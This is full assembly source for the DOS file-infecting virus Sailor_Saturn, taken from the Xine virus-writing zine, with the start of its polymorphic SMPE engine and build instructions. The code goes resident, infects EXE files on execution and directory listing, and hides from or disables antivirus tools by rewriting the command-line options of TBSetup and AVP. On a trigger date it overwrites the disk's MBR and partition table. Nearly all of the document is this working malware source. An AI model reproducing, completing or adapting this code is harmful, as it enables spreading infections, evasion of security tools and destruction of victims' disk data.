   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 211 |
   ;                                        \-----------------------------/



   ;
   ; Virus Name    : Sailor_Saturn
   ; Virus Author  : b0z0/iKx
   ; Origin        : Padania, Mid/Late 1997
   ; Target        : EXE files
   ; Poly          : SMPE v0.3
   ; Compiling     : TASM 3.0 prefeered
   ;                       TASM /m5 /l sat.asm
   ;                       TLINK sat
   ; Goodies       :
   ;               - Scans MCBs for resident antiviruses
   ;               - Fast infection when some programs are run.
   ;                       The fast infection is done on Findfirst/Findnext
   ;                       (4Eh/4Fh) calls. The virus will of course correct
   ;                       the lenght of the newly infected files in the DTA,
   ;                       so there won't be any shitty corruption or alarm
   ;                       from packagers or other stuff. The programs when
   ;                       Sailor_Saturn becames a very-fast infector are:
   ;                          Packagers    : PKZIP, ARJ, LHA, RAR
   ;                          Others       : TBSetup (so every file added to
   ;                                         the ANTI-VIR.DAT will be infected
   ;                                         and the data in the CRC file will
   ;                                         be correct... thanx TBSetup :)) ),
   ;                                         XCOPY (usual tool for copying under
   ;                                         a lot of DOS flavours, quite used),
   ;                                         BACKUP (or any file starting with
   ;                                         BACK, usual DOS backupping program)
   ;               - Modifies TBSetup command line options:
   ;                       If the users tries to just update new files to
   ;                       prevent storing the CRC of infected ones (using
   ;                       the no or newonly commands) the virus will delete
   ;                       that command line parameters with spaces. This will
   ;                       be done also if the user tries to use the pause (or
   ;                       pa) command that pauses after every full screen.
   ;                       Randomly (with a 1:8 probability) the bad commands
   ;                       (pa, no...) are substituted with a 'ad' parameter
   ;                       that orders to TBSetup to scan (ie. infect :) ) all
   ;                       the disk drives on the system ]8)
   ;               - Modifies AVP and AVPLITE line options setting the /M and /H
   ;                 options, this is don't scan memory and disable heuristics
   ;               - Doesn't infect many antiviruses
   ;               - Doesn't infect files with digits in the filename
   ;               - Some other usual antibait checks
   ;               - Nothing special, the 'good stuff' should be in the poly
   ;               - Payload with graphic effect on 14th sept. The original MBR
   ;                 will be substituted with one displaying the Padanian flag.
   ;                 If user will be smart enough, the original MBR will be
   ;                 restored and the user let to continue his work, check it
   ;                 out! :) The payload is done to say happy birthday to
   ;                 Padania (that born officially the 14th september 1997)
   ; Poly notes    :
   ;               - Creates really a lot of different garbage (math ops, ints,
   ;                 calls, reg stuff, pushes, pops, mem references, cmpares...
   ;                 give it a look) with various operand size and type
   ;               - Encryption using bytes, words and dwords
   ;               - Encryption using ROL/ROR with stable or changing rotations
   ;                 number
   ;               - Encryption using ADD/SUB/XOR with fixed or changing
   ;                 encryption value (changing enc value not for byte
   ;                 operations). The change to the encryption value will be
   ;                 done with an ADD/SUB/XOR with a random value or with a
   ;                 stable ROR/ROL of 1
   ;               - Encryption can be done from the start to the end or in the
   ;                 reverse way
   ;               - Some garbage instruction can be encrypted
   ;               - Can use all the pointer registers as pointers and all the
   ;                 registers except AX for counters and for key holders
   ;               - Generates a lot of different variants of loops and
   ;                 comparations for counters and such
   ;               - Some anti-emulation traps
   ;               - Quite fast poly, not too bigger than the previous versions
   ;                 even if it has plenty new features
   ;               - Should generate very variable size decryptors (from less than
   ;                 hundred bytes also up to 15kb decryptors, of course in some
   ;                 largest cases). Also big decryptors should not get tooooo
   ;                 much time to execute (except under win and such stuff) but
   ;                 should be quite bitching for AVs.
   ;               - Generate a few samples to see what it does, I already
   ;                 forgot what I wrote ;-)
   ;               - Maybe this is the last version of SMPE. I think that the
   ;                 poly itself is quite ok, the problem is that this type of
   ;                 poly conception is old, so I should not work on it too
   ;                 much in the future.
   ;
   ; This virus is dedicated to all the ppl in Padania. Padania libera!
   ;
   ;

   saturn          segment
                   assume cs:saturn,ds:saturn,es:saturn

   .386

                   org     00h

   saturn_start:
                   call    get_offset
   get_offset:
                   pop     bp

                   sub     bp,offset get_offset    ; bp has delta offset

                   mov     di,offset original_cs
                   add     di,bp

                   mov     ax,es
                   add     ax,10h
                   add     word ptr cs:[di],ax     ; restore host cs:ip

                   push    ax

                   mov     ax,1875h
                   int     21h                     ; residency check

                   cmp     ax,7975h
                   je      return_old_noseg

   not_present:
                   push    di
                   push    es

                   push    es
                   mov     ah,52h                  ; get list of lists
                   int     21h
                   mov     ds,word ptr es:[bx-2]   ; first mcb
                   mov     dx,ds
                   pop     es

   next_mcb:
                   mov     si,08h
                   mov     di,offset mem_strings
                   add     di,bp
                   lodsw                           ; ax <- ds:[08]

                   mov     cx,mem_string_num
   mem_loop:
                   cmp     ax,word ptr cs:[di]
                   je      return_old
                   inc     di
                   inc     di
                   loop    mem_loop

                   xor     si,si

                   lodsb                           ; al = ds:[0]
                   cmp     al,byte ptr cs:[di - (mem_string_num * 2) - 3]
                                                   ; last mcb ? ('Z')
                   je      last_mcb

                   inc     dx
                   add     dx,word ptr ds:[si+2]
                   mov     ds,dx                   ; on next mcb
                   jmp     next_mcb
   last_mcb:
                   xor     di,di

                   mov     ax,saturn_mem_para + 1  ; virus paras + one for mcb
                   sub     word ptr ds:[di+03h],ax
                   sub     word ptr es:[di+02h],ax
                   mov     byte ptr ds:[di],'M'

                   add     dx,word ptr ds:[di+03h]
                   inc     dx
                   mov     ds,dx

                   dec     ax                      ; ax = saturn_mem_para
                   mov     byte ptr ds:[di],'Z'    ; last block
                   mov     word ptr ds:[di+01h],8h ; owner dos
                   mov     word ptr ds:[di+03h],ax
                   mov     dword ptr ds:[di+08h],'SOD'

                   inc     dx                      ; virus memory block
                   mov     es,dx

                   push    cs
                   pop     ds

                   mov     cx,(saturn_mem_size + 1)/2
                   mov     si,bp
                   rep     movsw                   ; copy the virus to mem

                   push    es
                   pop     ds

                   mov     ax,3521h                ; save int21h
                   int     21h

                   push    es
                   push    bx
                   pop     dword ptr ds:[old_21h]

                   mov     dx,offset vir_21handler ; hook int 21h in a winzooz
                   mov     ax,2521h                ; compatible way
                   int     21h

                   mov     byte ptr ds:[filename],'\'      ; fastinf init so
                                                           ; inf routines are
                                                           ; the same as for 4bh

                   mov     ah,2ah                  ; get date
                   int     21h

                   cmp     dx,090eh                ; the 14th of september?
                   jne     return_old

                   call    payload_activation

   return_old:
                   pop     es
                   pop     di

   return_old_noseg:

                   pop     ax

                   push    es
                   pop     ds

                   jmp     prefetch_jump           ; must be quite sure that
                                                   ; later cs:ip pushes won't
                                                   ; be prefetched

   vir_name        db      'Sailor_Saturn',0
   vir_auth        db      '-b0z0/iKx-',0

   original_ss     dw      00000h
   z_char          db      'Z'
   original_sp     dw      00000h

   mem_string_num  =       4                       ; number of mem strings
   file_string_num =       10                      ; number of file strings
   mem_strings     db      'TB','NE','VI','NA','F-','AV','FI','MS','SC','CO'
   last_name       db      'NL'                    ; this word will contain the
                                                   ; first two letters of the
                                                   ; last infected filename.
                                                   ; Since two quite equal named
                                                   ; files should be a bait
   back_there:

                   xor     bx,bx                   ; zero regs
                   sub     cx,cx
                   xor     dx,dx
                   sub     si,si
                   xor     bp,bp

                   cli                             ; set original SS:SP
                   add     ax,word ptr cs:[di+ (original_ss - original_cs)]
                   mov     ss,ax
                   mov     sp,word ptr cs:[di+ (original_sp - original_cs)]
                   sti

                   xor     di,di
                   sub     ax,ax

                   db      68h                     ; push cs
   original_cs     dw      0fff0h
                   db      68h                     ; push ip
   original_ip     dw      00000h
                   retf                            ; go to orig cs:ip


   simulate21:
                   pushf
                   call    dword ptr cs:old_21h
                   ret

   payload_activation:
                   push    ds                      ; DS = ES = virus block in mem
                   pop     es

                   mov     bx,offset saturn_stack  ; we use code and stack from
                                                   ; the virus just loaded in mem
                   mov     ax,201h
                   mov     dx,80h                  ; read the MBR to our mem
                   mov     cx,1
                   int     13h

                   mov     ax,301h                 ; save MBR at 0,0,4
                   mov     cx,4
                   int     13h

                   mov     di,bx
                   mov     si,offset payload_mbr

                   mov     ax,(512 - 4) / 4
                   mov     cx,(payload_mbr_lenght + 3) / 4 ; lenght in dwords
                   sub     ax,cx
                   rep     movsd

                   mov     cx,ax

                   mov     eax,' NDP'              ; be sure that the partition
                   rep     stosd                   ; table will be overwritten

                   mov     word ptr ds:[saturn_stack + 200h - 2h],0aa55h

                   mov     ax,301h                 ; write the virus mbr
                   mov     cx,1
                   int     13h

                   ret

   ; Fast infection on 4Eh/4Fh (Findfirst/Findnext)
   findfirst_call:
                   pusha
                   push    es

                   cld
                   lea     di,(filename+1)
                   mov     si,dx
                   push    cs
                   pop     es
                   mov     word ptr cs:[di-5],di   ; offset of filename
   getpath:
                   lodsb                           ; save search path
                   cmp     al,00h
                   je      pathexit
                   stosb                           ; es:di = filename
                   cmp     al,':'
                   je      ok_sepa
                   cmp     al,'\'
                   jne     getpath
   ok_sepa:
                   mov     word ptr cs:[filenameoff],di
                   jmp     getpath
   pathexit:
                   pop     es                      ; restore regs
                   popa

   findnext_call:
                   call    simulate21

                   pusha
                   push    ds
                   push    es
                   pushf

                   cld

                   mov     ah,2fh                        ; get DTA
                   call    simulate21

                   mov     di,cs:[filenameoff]
                   mov     si,bx
                   add     si,1eh                        ; filename
                   push    es
                   pop     ds
                   push    cs
                   pop     es

                   push    si
   getfname:
                   lodsb
                   stosb
                   cmp     al,'.'
                   jne     isntadot
                   mov     word ptr cs:[filedotoff],di   ; save dot position
   isntadot:
                   or      al,al               ; end of filename?
                   jne     getfname

                   pop     si

                   push    ds
                   pop     es                      ; ES:SI on filename in DTA

                   push    cs
                   pop     ds

                   mov     dx,offset filename + 1
                   mov     di,[filedotoff]
   founded_dot:
                   cmp     dword ptr ds:[di-1],'EXE.'   ; .exe
                   jne     go_away
   ok_inf:
                   mov     word ptr ds:[inflenght],00h
                   call    infect_fast
                   xor     eax,eax
                   mov     ax,word ptr ds:[inflenght]
                   add     dword ptr es:[si-1eh+1ah],eax   ; set real (infected)
                                                           ; lenght in the DTA
   go_away:
                   popf
                   pop     es
                   pop     ds
                   popa

                   retf    2

   ; Virus Int 21h handler
   vir_21handler:
                   cmp     ax,1875h
                   jne     no_resid
                   mov     ax,7975h                ; residency check
                   iret
   no_resid:

                   cmp     byte ptr cs:[fast_infection],00h
                   je      no_fast_inf

                   cmp     ah,4eh
                   je      findfirst_call

                   cmp     ah,4fh
                   je      findnext_call

   no_fast_inf:
                   cmp     ax,4b00h                ; exec?
                   je      exec_call

                   cmp     ah,4ch                  ; program exiting?
                   jne     chain_21h               ; if so reset fast_inf

                   mov     byte ptr cs:[fast_infection],00h

   chain_21h:
                   db      0eah
   old_21h         dd      0000h


   exec_call:
                   pushf
                   push    offset exit_vir_vl

   infect_fast:

                   cli
                   mov     word ptr cs:[int21h_sp],sp      ; set to our stack
                   mov     word ptr cs:[int21h_ss],ss
                   mov     sp,cs
                   mov     ss,sp
                   mov     sp,offset stack_end - 1
                   sti

                   push    ds
                   push    es
                   pushad

                   mov     ah,19h
                   call    simulate21

                   cmp     al,2
                   jae     ok_disk
                   jmp     exit_vir

   ok_disk:
                   cld
                   mov     si,dx
   name_loop:
                   lodsb
                   cmp     al,'.'
                   jne     name_loop
                   cmp     byte ptr ds:[si+3],00h
                   jne     name_loop

                   dec     si
                   dec     si
                   std
   slash_loop:
                   lodsb
                   cmp     al,'0'                  ; no digits in filename
                   jb      no_number
                   cmp     al,'9'
                   jbe     exit_vir
   no_number:
                   cmp     al,'\'
                   jne     slash_loop

                   inc     si
                   inc     si
                   cld

                   lodsd                           ; EAX = first 4 letters

                   cmp     byte ptr cs:[fast_infection],01h
                   je      no_fast_now             ; if already in fastinf then
                                                   ; we should be in a 4eh/4fh,
                                                   ; so no param change of coz :)

                   cmp     eax,'ESBT'              ; TBSEtup running maybe?
                   jne     no_tbsetup

                   cmp     dword ptr es:[si],'.PUT'        ; be sure about it
                   jne     no_tbsetup

   tbsetup_cmd:
                   ; ES:BX on exec parameter block
                   pusha
                   push    ds

                   mov     ds,word ptr es:[bx+04h]
                   mov     si,word ptr es:[bx+02h]

                   ; DS:SI are on the command line parameters

                   mov     di,2020h
                   call    do_random_dx_0f                 ; get a rnd number
                                                           ; from poly generator
                   or      al,al
                   jnz     not_too_evil
                   mov     di,'da'                         ; set 'Entire disk'
                                                           ; instead of spaces
                                                           ; as the cmdline if
                                                           ; bad command found ]:)
   not_too_evil:
                   push    di
                   push    di
                   pop     ebx

                   mov     dl,0dh                          ; cr in dl

   cmdline_loop:
                   mov     al,byte ptr ds:[si]
                   inc     si

                   cmp     al,dl                           ; CR? end of cmdline
                   je      end_cmdline

                   cmp     al,bl                           ; space?
                   je      cmdline_loop

                   cmp     byte ptr ds:[si-2],bl           ; beginning of a cmd?
                   jne     cmdline_loop

                   mov     cl,byte ptr ds:[si+1]

                   mov     ah,byte ptr ds:[si]
                   or      ax,bx                           ; convert to lowercase

                   cmp     ax,'ap'                         ; pause at cmdline?
                   jne     no_pause

                   cmp     cl,dl
                   je      good_pause

                   cmp     cl,bl
                   jne     long_pause
   good_pause:
                   mov     word ptr ds:[si-1],di           ; delete bad cmd
                   jmp     cmdline_loop
   long_pause:
                   mov     ax,word ptr ds:[si+2]
                   or      ax,bx

                   cmp     ax,'es'                         ; seems pause?
                   jne     cmdline_loop

                   cmp     byte ptr ds:[si+4],dl
                   je      good_lpa

                   cmp     byte ptr ds:[si+4],bl
                   jne     cmdline_loop
   good_lpa:
                   mov     dword ptr ds:[si],ebx
                   mov     word ptr ds:[si-1],di           ; delete bad cmd
   no_pause:
                   cmp     ax,'on'                         ; no (newonly) ?
                   jne     no_news

                   cmp     cl,dl                           ; a CR after 'no' ?
                   je      good_param

                   cmp     cl,bl                           ; a space after it?
                   jne     no_news                         ; if not maybe just a
                                                           ; filemask, no param
   good_param:
                   mov     word ptr ds:[si-1],di           ; delete bad cmd

   no_news:
                   cmp     ax,'en'                         ; newonly?
                   jne     cmdline_loop

                   mov     ax,word ptr ds:[si+4]
                   or      ax,bx

                   cmp     ax,'yl'                         ; seems newonly?
                   jne     cmdline_loop

                   cmp     byte ptr ds:[si+6],dl           ; a CR after cmd ?
                   je      good_long

                   cmp     byte ptr ds:[si+6],bl           ; a space after it?
                   jne     cmdline_loop

   good_long:
                   mov     dword ptr ds:[si],ebx           ; delete with some
                   mov     byte ptr ds:[si-1],bl           ; spaces
                   mov     word ptr ds:[si+4],di           ; delete bad cmd

                   jmp     cmdline_loop
   end_cmdline:
                   pop     ds
                   popa

                   jmp     set_fast
   no_tbsetup:
                   cmp     eax,'IZKP'              ; PKZIp running maybe?
                   je      set_fast

                   cmp     eax,'.AHL'              ; LHA running?
                   je      set_fast

                   cmp     eax,'.RAR'              ; RAR running?
                   je      set_fast

                   cmp     eax,'.JRA'              ; ARJ running?
                   je      set_fast

                   cmp     eax,'POCX'              ; XCOPy running?
                   je      set_fast

                   cmp     eax,'KCAB'              ; Backupper running?
                   je      set_fast

                   cmp     eax,'.PVA'              ; AVP running?
                   je      nomem_toavp

                   cmp     eax,'LPVA'              ; should be AVPLite?
                   jne     no_fast_now

                   cmp     dword ptr es:[si],'.ETI'; really AVPLITE ?
                   jne     no_fast_now

   nomem_toavp:
                   pusha
                   push    ds

                   mov     ds,word ptr es:[bx+04h] ; to params
                   mov     si,word ptr es:[bx+02h]

                   add     byte ptr ds:[si],05h    ; adjust lenght of params

   search_end:
                   lodsb
                   cmp     al,0dh                  ; end of params?
                   jne     search_end

                   mov     dword ptr es:[si-1],'/M/ '   ; add ' /M/H' + CR
                   mov     word ptr es:[si+3],0d48h     ; at the end of the
                                                        ; avp command line
                   pop     ds
                   popa

                   jmp     no_fast_now
   set_fast:
                   mov     byte ptr cs:[fast_infection],01h
   no_fast_now:
                   mov     cx,file_string_num + 1          ; the AVs or such plus
                                                           ; one last infected
                                                           ; file (antibait)
                   cmp     byte ptr cs:[fast_infection],01h
                   jne     normal_ab
                   dec     cx                              ; on fastinf just
                                                           ; infect fast! :)
   normal_ab:
                   mov     si,offset mem_strings - 2
   avf_loop:
                   inc     si
                   inc     si

                   cmp     ax,word ptr cs:[si]     ; an AV ?
                   je      exit_vir
                   loop    avf_loop

                   mov     word ptr cs:[tmp_name],ax

                   mov     es,cx

                   push    cs
                   push    offset vir_24handler
                   pop     eax

                   cli
                   xchg    eax,dword ptr es:[090h]         ; set our int24h
                   mov     dword ptr cs:[old_24h],eax
                   sti

                   mov     ax,4300h
                   call    simulate21              ; get attribs

                   push    ds
                   push    dx                      ; save attribs
                   push    cx

                   xor     cx,cx
                   call    chmod_file              ; reset attribs

                   jnc     chmod_ok

                   add     sp,6
                   jmp     exit_vir_24

   chmod_ok:
                   mov     ax,3d02h                ; open for rw
                   call    simulate21
                   jc      exit_vir_att

                   mov     bx,ax

                   mov     ax,5700h                ; get file time
                   call    simulate21
                   push    dx
                   push    cx

                   push    cs
                   pop     ds

                   mov     ah,3fh                  ; read
                   mov     cx,1ch
                   lea     dx,head_buffer
                   call    simulate21

                   mov     si,dx

                   mov     ax,'ZM'

                   sub     ax,word ptr ds:[si]     ; MZ check
                   jnz     not_an_exe

                   mov     ax,word ptr ds:[si+12h]         ; infection mark
                   xor     ax,word ptr ds:[si+02h]
                   sub     ax,'SS'                         ; already infected?
                   jz      not_an_exe
                   cmp     byte ptr ds:[si+18h],'@'        ; no winexes
                   je      not_an_exe
                   cmp     word ptr ds:[si+1ah],00h        ; no overlays
                   jne     not_an_exe

                   call    infect_exe

   not_an_exe:
                   pop     cx
                   pop     dx
                   mov     ax,5701h                ; set old time
                   call    simulate21

                   mov     ah,3eh                  ; close
                   call    simulate21

   exit_vir_att:
                   pop     cx
                   pop     dx
                   pop     ds
                   call    chmod_file              ; set old attributes

   exit_vir_24:

                   xor     ax,ax                   ; set the old int24h
                   mov     ds,ax
                   push    dword ptr cs:[old_24h]

                   cli
                   pop    dword ptr ds:[090h]
                   sti

   exit_vir:
                   popad
                   pop     es
                   pop     ds

                   cli
                   mov     ss,word ptr cs:[int21h_ss]
                   mov     sp,word ptr cs:[int21h_sp]
                   sti

                   ret                             ; return to fast inf routine
                                                   ; or continue to exit_vir_vl
                                                   ; depending on how infection
                                                   ; was called
   exit_vir_vl:
                   popf
                   jmp     chain_21h


   chmod_file:
                   mov     ax,4301h
                   call    simulate21
                   ret

   infect_exe:
                   push    dword ptr ds:[si+14h]           ; store CS:IP
                   pop     word ptr ds:[original_ip]
                   pop     word ptr ds:[original_cs]       ; store orig CS

                   push    dword ptr ds:[si+0eh]           ; store SS:SP
                   pop     word ptr ds:[original_ss]
                   pop     word ptr ds:[original_sp]

                   mov     cx,word ptr [si+04h]    ; calculate real lenght
                   mov     ax,512
                   mul     cx
                   add     ax,word ptr [si+02h]
                   adc     dx,00h

                   mov     di,dx
                   push    ax

                   mov     al,02h
                   call    lseekfile

                   pop     cx

                   cmp     dx,di
                   jbe     ok_lenght
   exit_lenght:
                   ret
   ok_lenght:
                   cmp     ax,cx
                   ja      exit_lenght

                   push    ax
                   and     ax,01ffh                ; can be divided by 1024
                   pop     ax
                   jz      exit_lenght

                   push    ax                      ;store length
           push    dx

           mov cx,10h
           div cx

           sub ax,word ptr [si+08h]
                   mov     word ptr [si+14h],dx
           mov word ptr [si+16h],ax

                   mov     bp,dx

                   push    dx
                   push    ds
                   push    ax
                   push    si

                   push    0fh
                   in      al,40h          ; max garbage will be 0Fh or 1Fh ?
                   ror     al,1
                   pop     ax
                   jnc     no_plus10
                   add     ax,10h
   no_plus10:
                   cmp     byte ptr ds:[fast_infection],01h
                   jne     good_garbage

                   push    03h             ; if fastinfection then limit the
                   in      al,40h          ; max garbage in every section to
                   ror     al,1            ; 3 or to 7 (randomly selected) so
                   pop     ax              ; it will be faster
                   jnc     good_garbage
                   add     ax,04h

   good_garbage:
                   mov     cx,saturn_size
                   xor     dx,dx

                   call    smpe            ; Call poly engine

                   push    es
                   pop     ds
                   pop     si

                   jnc     ok_poly
                   add     sp,0ah          ; if error correct stack and exit
                   ret
   ok_poly:

                   mov     ah,40h                  ;write virus at end
                   push    cx
                   push    cx
                   pop     word ptr cs:[inflenght]
                   call    simulate21

                   sub     al,al                   ;move at start
                   call    lseekfile

                   pop     cx
                   pop     ax
                   pop     ds
                   pop     dx

                   add     word ptr [si+14h],di

                   cmp     byte ptr [seg_sta],02h
                   je      cs_must_equ_ss

                   inc     ax                      ; SS = CS + 1 except when
                                                   ; BP used, so SS=CS
   cs_must_equ_ss:
                   mov     word ptr [si+0eh],ax    ; new stack segment

                   add     dx,cx                   ; just after body
                   add     dx,500h                 ; some more is needed
                   and     dl,0feh
                   mov     word ptr ds:[si+10h],dx ; new stack pointer

                   pop     dx
                   pop     ax

                   add     ax,cx
                   mov     cx,200h                 ; one page
                   adc     dx,00h
                   div     cx

                   mov     word ptr [si+02h],dx    ; new length

                   inc     ax
                   mov     word ptr [si+04h],ax    ; new length

                   xor     dx,'SS'
                   mov     word ptr [si+12h],dx    ; set infection marker

                   mov     ah,40h
                   mov     cx,1ch                  ; write new header
           mov dx,si
                   call    simulate21

                   push    word ptr ds:[tmp_name]  ; good infection, so put name
                   pop     word ptr ds:[last_name] ; not to infect next time

   exitexeinfect:
           ret

   vir_24handler:
                   mov     al,00h
                   iret

   lseekfile:
                   mov     ah,42h                 ; move to start or end
           cwd
           sub cx,cx
                   call    simulate21
                   ret


   ; Here starts the MBR that will be set on payload activation
   payload_mbr:
                   cli
                   xor     ax,ax
                   mov     ss,ax
                   mov     sp,7c00h                ; set SS:SP as usual
                   sti

           push    cs
           pop ds

                   mov     al,02h                  ; set to 80x25
                   int     10h

                   mov     ah,01h
                   xor     cx,cx                   ; set cursor invisible
                   int     10h

                   mov     ax,1000h                ; set palette register
                   push    ax
                   mov     bx,2a0ah                ; reg 0a to 2a, our green
                   int     10h

                   pop     ax
                   mov     bx,3f07h                ; reg 07 to our white
                   int     10h

           mov ax,0b800h
           mov es,ax

                   mov     si,(offset disegno - offset payload_mbr + 7c00h)
                                                   ; DS:SI on our data
                   xor     di,di                   ; ES:DI video memory

   ;
   ; since the "Sole delle Alpi" has two coordinates of simmetry we just have
   ; a quarter of it as data and we will calculate the other three points that
   ; are equal
   ;
                   mov     cx,13d                  ; lines to draw (in reality
                                                   ; 13 * 2 - 1, since the sun
                                                   ; is simmetric and the central
                                                   ; line will be drawn twice)
   next_line:
           push    cx
                   mov     cl,10d                  ; every halfline (since the sun
                                                   ; is simmetric in both X and Y)
                                                   ; is made of 10 bytes
   next_entry:
                   lodsb

           push    cx
                   mov     cl,04h                  ; every byte contains 4 chars
           mov bl,al
   this_word:
                   mov     ax,07a20h               ; colours and space char

                   shl     bl,1                    ; decode the char to be made
                   jnc     is_a_zero               ; 11 = space
                   shl     bl,1                    ; 00 = full rectangle
                   jc      draw_it                 ; 01 = high half of rect.
                   add     al,0bch                 ; 10 = low half of rect.
           jmp draw_it
   is_a_zero:
           add al,0bbh
           shl bl,1
           jnc draw_it
           add al,4
   draw_it:
           mov bh,23
                   mov     dx,di                   ; here we calculate at which
   dododo:                                         ; line we currently are (out
                   cmp     dx,80d                  ; in BH) and in which column
                   jb      okeee                   ; (out in DX)
                   sub     dx,80d
           dec bh
           jmp dododo
   okeee:
                   add     dx,dx                   ; * 2, since the is also a
                                                   ; colour byte
                   push    ax

           push    di
           sub di,dx
                   add     di,09fh-1               ; calculate the coord. of the
                   stosw                           ; point on the right half of
                   pop     di                      ; the display

           push    di
   lin_loo:
                   add     di,160d
           or  bh,bh
                   jz      fin1                    ; calculate the coord. of the
                   dec     bh                      ; point on the bottom half of
                   jmp     lin_loo                 ; the display
   fin1:
           cmp al,0dch
                   jne     not_bass                ; we must convert low half
                   mov     al,0dfh                 ; rect. to high and high to low
           jmp stototo
   not_bass:
           cmp al,0dfh
           jne stototo
           mov al,0dch
   stototo:
           stosw
           sub di,dx
                   add     di,09fh-3               ; finally the bottom right part
                   stosw
           pop di

           pop ax

                   stosw                           ; store the upper left part

           loop    this_word

                   pop     cx
                   loop    next_entry

           pop cx
                   add     di,40*2                 ; next line
                   loop    next_line

   ; end of drawing

   ; SI is already on the string we have to check
                   push    si
   kbd_check:
                   mov     ah,10h                  ; get keystroke (wait if none)
                   int     16h

                   cmp     al,byte ptr ds:[si]     ; control if user is typing our
                   jne     goto_start              ; magic string

                   inc     si

                   cmp     byte ptr ds:[si],00h    ; end of string
                   je      good_phrase

                   jmp     kbd_check
   goto_start:
                   pop     si
                   push    si
                   jmp     kbd_check

   good_phrase:
   ; If user says types in "Free Padania" then we will restore the original MBR
   ; and boot from there

                   pop     si                      ; correct stack

                   push    cs
                   pop     es

                   mov     ax,201h
                   mov     bx,7e00h                ; mem after ourselves
                   mov     dx,80h
                   mov     cx,4h                   ; read original MBR
                   int     13h                     ; from 0,0,4

                   mov     ax,301h
                   mov     cx,1
                   int     13h                     ; reput original MBR on disk

                   xor     ax,ax
                   dec     ax
                   push    ax
                   inc     ax
                   push    ax
                   retf
                                                   ; jump there will reboot and let
                                                   ; the user continue on it's way
                                                   ; after the reboot with the
                                                   ; clear idea that Padania
                                                   ; should be free!
   disegno:
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111111b,11111111b,11111111b,11101010b,10101010b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111111b,11111111b,10100001b,01010111b,11111110b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111111b,11100001b,01111111b,11111111b,11111000b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11111110b,00011111b,11111111b,11111111b,11110000b
      db     11111111b,11111111b,11111111b,11111111b,11111111b
      db     11100001b,11111111b,11111111b,11111111b,11000000b
      db     11111111b,11111111b,11111111b,11111111b,11111110b
      db     00011111b,11111111b,11111111b,11111111b,11000000b
      db     11111111b,11111111b,11111111b,11111111b,11111000b
      db     01000000b,00001010b,10101111b,11111111b,11000000b
      db     11111111b,11111111b,11111111b,11111111b,11100011b
      db     11110100b,00000000b,00000000b,10101111b,11000000b
      db     11111111b,11111111b,11111111b,11111111b,11000111b
      db     11111111b,01010000b,00000000b,00000010b,10110000b
      db     11111111b,11111111b,11111111b,11111111b,11001111b
      db     11111111b,11111101b,01000000b,00000000b,00000000b
      db     11111111b,11111111b,11111111b,11111111b,00001111b
      db     11111111b,11111111b,11111101b,01010000b,00000000b
      db     11111111b,11111111b,11111111b,11111111b,00001111b
      db     11111111b,11111111b,11111111b,11111111b,00000000b

   string  db      'Free Padania',0

   payload_mbr_end:

   payload_mbr_lenght=offset payload_mbr_end - offset payload_mbr

   prefetch_jump:
                                                   ; check if possible
                   push    'iH'                    ; enemy around
                   pop     bx
                   dec     sp
                   dec     sp
                   pop     cx
                   cmp     cx,bx
                   je      ok_stack

                   mov     ax,02h
                   sub     di,(offset original_ss - original_cs)
                                                   ; if tracer cathed
                                                   ; on restoration SS:SP will
                                                   ; be equal to (CS+02h):IP
                                                   ; i hope he won't use the
                                                   ; stack ;)
   ok_stack:
                   jmp     back_there

   include         spoly.asm                       ; SMPE 0.3

   saturn_end:
   ; End of Sailor_Saturn on disk

   head_buffer     db      1ch     dup (?)   ; buffer for infection

   inflenght       dw      00h               ; lenght of infection for DTA
   tmp_name        dw      00h               ; tmp space for first 2 fname chars
   filenameoff     dw      ?                 ; stuff for 4eh/4fh infection
   filedotoff      dw      ?
   filename        db      4ch     dup (?)

   fast_infection  db      00h                     ; 00h = Off, 01h = On
   old_24h         dd      0000h                   ; int 24h seg:off

   int21h_ss       dw      00h
   int21h_sp       dw      00h

   saturn_stack    db      800h    dup (?)
   stack_end:

   saturn_mem_end:
   ; End of Sailor_Saturn in memory

   saturn_size     =       (saturn_end - saturn_start - poly_mem_used + 1)
   saturn_mem_size =       (saturn_mem_end - saturn_start)
   saturn_mem_para =       (saturn_mem_size + 0fh) / 10h

   saturn  ends
   end     saturn_start

   ÄÄÄ[SPOLY.ASM]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ;
   ; Sailor Moon Poly Engine v0.3
   ; in:
   ;    CX = bytes to encrypt
   ;    DS:DX = what we are going to encrypt (body of ourselves)
   ;    BP = offset at which it will run
   ;    AX = max number of garbage instructions to generate
   ; it is assumed that DS=CS !!!
   ;
   ; out:
   ;    CX    = lenght of the generated code
   ;    DI    = offset at which enter to the poly (considering that the real
   ;            start is at SEG:0 but we want to make some garbage before the
   ;            real entrypoint)
   ;    ES:DX = generated code
   ;    BX    = preserved
   ;
   ;

   poly_mem_used=(poly_data_mem_end-poly_data_mem)
   poly_paras=0a00h                   ; temp memory for poly is 40kbs, a lot
                                      ; more than enough, but to be sure

   smpe:
           cld
           mov     word ptr ds:[gnum],ax
           push    bx

   ;; Try to allocate the needed memory for the poly stuff

           mov     ah,48h                          ; allocate mem for our poly
           mov     bx,poly_paras
           call    simulate21
           jnc     ok_memory

           pop     bx
           stc                                     ; no mem avaiable :(
           ret
   ok_memory:
           mov     es,ax                           ; allocated segment

           push    cx
           push    ds                              ; save important regs
           push    dx

   ;; Initialization start

           call    add_to_cx

           xor     ebx,ebx
           mov     ax,9090h

           mov     si,offset isword

   ; SI used for many mem references... ONLY in the main decryptor creation
   ; loop
   ;       points:
   ; -8    enc_lenght
   ; -6    last_done
   ; -5    reg8bits
   ; -4    pointer_di
   ; -2    secphs
   ; SI    isword
   ; +1    isrolror
   ; +2    push_nr
   ; +3    can_doda
   ; +4    count_reg
   ; +5    point_reg
   ; +6    nocx
   ; +7    seg_sta
   ; +8    emu_trick
   ; +9    inverse
   ; +A    cmp_check
   ; +B    cmp_check2
   ; +C    ds_mody
   ; +D    counter_pos
   ; +F    jz_nr
   ; +11   no_imm

